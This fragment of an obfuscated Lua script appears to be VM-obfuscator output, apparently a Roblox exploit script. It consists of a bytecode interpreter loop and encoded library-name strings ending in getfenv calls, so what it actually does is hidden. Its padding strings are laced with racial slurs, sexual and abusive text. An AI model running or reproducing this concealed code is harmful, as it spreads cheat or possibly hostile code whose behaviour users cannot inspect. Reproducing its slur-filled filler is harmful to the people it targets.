e[d-1]={n,o[c]};else e[d-1]={P,o[f]};end;C[#C+1]=e;end;n[o[s]]=S(a,d,O);break end while 915==(e)/((3644-0x72e))do local l=o[b];local e=n[o[c]];n[l+1]=e;n[l]=e[o[N]];break end;break;end break;end while 1707==(e)/((((-36+-0x51)+0x231)+-#'i would jerk off to federals feet'))do e=(284955)while d<=(200-0x8e)do e-= e e=(7205094)while(0x92-89)<d do e-= e n[o[g]]();break end while(e)/((-#[[MSC 793z487nhvcgsdfgsudfza9889jgvz56gz56z547684z5g54z948g56z74j56475jzg645z6456 oh wait bitch]]+(0xd3c+-97)))==2253 do if n[o[k]]then l=l+a;else l=o[f];end;break end;break;end while(e)/((-93+0x36e))==363 do e=(1475197)while(0x318d/(0x13a+-99))>=d do e-= e n[o[g]]=O[o[m]];break;end while(e)/(((0x14985/117)+-#"monobola"))==2069 do e=(6420278)while d>(-#[[use luraph if want lost money]]+(-84+0xad))do e-= e O[o[w]]=n[o[x]];break end while(e)/((-#'Ok guys relax Theyre just fucking socks Its impossible for socks to turn me gay My heterosexuality will be fine dudes'+(0x8c79c/198)))==2302 do n[o[s]]=n[o[h]][o[N]];break end;break;end break;end break;end break;end while(e)/(((-0x5a+9)+3423))==1417 do e=(5139064)while((-50+0xd5)+-#[[People trying to play roblox colon meanwhile crosswoods colon may I introduce myself question mark]])>=d do e-= e e=(2364341)while(13482/(0x786/9))>=d do e-= e e=(783960)while d>(13702/0xdd)do e-= e n[o[x]]=P[o[c]];break end while(e)/((((0xdd2-1810)+-#"nicuse is nil skull")+-41))==470 do local e=o[k]n[e](n[e+r])break end;break;end while 3857==(e)/(((1380-0x2dc)+-35))do e=(1288850)while(-40+0x68)<d do e-= e local e={n,o};e[r][e[i][b]]=e[a][e[i][j]]+e[r][e[i][c]];break end while(e)/((7561-((824328/0xd6)+-#'atakan der nigga')))==346 do O[o[w]]=n[o[u]];break end;break;end break;end while 3941==(e)/((1321+-0x11))do e=(1969996)while(7169/0x6b)>=d do e-= e e=(12253934)while d>((14616/0xa8)+-#[[impulse reel pastebin]])do e-= e local e=o[u]n[e](n[e+r])break end while 3619==(e)/((0x1ac3-3465))do local e=o[b]n[e]=n[e](q(n,e+a,o[c]))break end;break;end while(e)/((1084+-0x1a))==1862 do e=(6904467)while(((22+-0x38)+118)+-#"jjsploit winning")>=d do e-= e if(n[o[k]]~=n[o[_]])then l=l+r;else l=o[m];end;break;end while 2451==(e)/((-91+0xb5c))do e=(655248)while(0xc5-128)<d do e-= e local e=o[u];local d=n[e]local a=n[e+2];if(a>0)then if(d>n[e+1])then l=o[m];else n[e+3]=d;end elseif(d<n[e+1])then l=o[U];else n[e+3]=d;end break end while 2992==(e)/(((-0x67+333)+-#"free luraph"))do n[o[u]]={};break end;break;end break;end break;end break;end break;end break;end l+= r end;end);end;return S(z(),{},T())()end)_msec({[((-0x32+33934)/197)]='\115\116'..(function(e)return(e and'㒟㒟㒦㒣㒙㒠㒠㒡')or'\114\105'or'\120\58'end)((0x91/(-#'abortion is a right dont take it away in the USA date 2022'+(-78+0xa5)))==(127-0x79))..'\110g',["㒠㒘㒣㒚㒘㒙㒜㒚㒠㒝㒚㒣㒣"]='\108\100'..(function(e)return(e and'㒣㒜㒗㒙㒟㒛㒣㒘㒞㒝㒡㒥㒤㒤㒡㒘㒘㒠')or'\101\120'or'\119\111'end)((46-0x29)==(-#'no h'+(1710/0xab)))..'\112',["㒤㒟㒤㒡㒢㒘㒣㒚㒣㒜㒢"]=(function(e)return(e and'㒣㒘㒣㒣㒚㒞㒛㒙㒗㒘㒞㒡㒚㒗')and'\98\121'or'\100\120'end)((89-0x54)==(0x39+-52))..'\116\101',["㒡㒞㒜㒢㒢㒥㒢㒜㒠㒜㒞㒟㒜㒙㒜㒛㒞"]='\99'..(function(e)return(e and'㒛㒘㒗㒥㒢㒘㒤㒘㒢㒥㒜')and'\90\19\157'or'\104\97'end)((83+-0x4e)==(-#'free pornhub premium'+(89-(-#"MSC 793z487nhvcgsdfgsudfza9889jgvz56gz56z547684z5g54z948g56z74j56475jzg645z6456 oh wait bitch"+(0x4c65/123)))))..'\114',[(-100+0x2a2)]='\116\97'..(function(e)return(e and'㒢㒛㒠㒙㒡㒘㒙㒦㒢㒠㒞')and'\64\113'or'\98\108'end)((-#[[cilertedcool]]+(-72+0x5a))==((0xd9-150)+-#[[you can pull my IP but you cant pull any bitches fucking loner]]))..'\101',["㒛㒠㒠㒥㒠㒛㒗㒞"]=(function(e)return(e and'㒣㒤㒠㒚㒜㒚㒞㒚㒡㒢㒛㒣㒣㒚')or'\115\117'or'\78\107'end)((-0x77+(302-0xb4))==(0x56-55))..'\98',["㒥㒦㒝㒥㒚㒗㒝㒦㒟㒟㒝㒤"]='\99\111'..(function(e)return(e and'㒤㒤㒡㒣㒣㒢㒛㒜㒘㒘㒛㒛')and'\110\99'or'\110\105\103\97'end)(((317-0xcf)-0x4f)==(50+-0x13))..'\97\116',[(-118+(790+-0x30))]=(function(e,o)return(e and'㒘㒦㒡㒞㒥㒘㒝㒤㒠㒙㒞㒤㒙㒠')and'\48\159\158\188\10'or'\109\97'end)(((792/0x21)+-#'luraph deobfuscator')==(1428/0xee))..'\116\104',[(23290/(50-0x21))]=(function(o,e)return((110-0x69)==(0x53-80)and'\48'..'\195'or o..((not'\20\95\69'and'\90'..'\180'or e)))or'\199\203\95'end),["㒛㒦㒙㒢㒣㒘㒙㒜"]='\105\110'..(function(e,o)return(e and'㒚㒟㒗㒣㒤㒟㒦㒦㒤㒦㒜')and'\90\115\138\115\15'or'\115\101'end)(((125-(23112/0xd6))+-#'Suck Sus0587')==((126-0x4d)+-#'Zapperqr is leaker'))..'\114\116',["㒚㒙㒣㒥㒙㒟㒙㒘㒛㒢㒣㒘"]='\117\110'..(function(e,o)return(e and'㒥㒘㒝㒟㒞㒝㒡㒜')or'\112\97'or'\20\38\154'end)((0x38+-51)==(130+-0x63))..'\99\107',["㒟㒢㒜㒡㒚㒗㒝㒚㒡㒟㒗㒠㒜"]='\115\101'..(function(e)return(e and'㒠㒛㒟㒙㒛㒟㒢㒡')and'\110\112\99\104'or'\108\101'end)(((-75+0x6f)+-#"Generated by nicuses right ball")==(3813/0x7b))..'\99\116',["㒝㒣㒚㒚㒟㒤㒜㒗㒞㒠㒢㒙"]='\116\111\110'..(function(e,o)return(e and'㒞㒘㒚㒘㒗㒦㒢㒗㒙㒤㒟㒙')and'\117\109\98'or'\100\97\120\122'end)(((0xd48/100)+-29)==((0x2575/223)+-#'i still cannot find who the fuck asked'))..'\101\114'},{["㒙㒞㒡㒤㒘㒛㒣㒝"]=((getfenv))},((getfenv))()) end)()
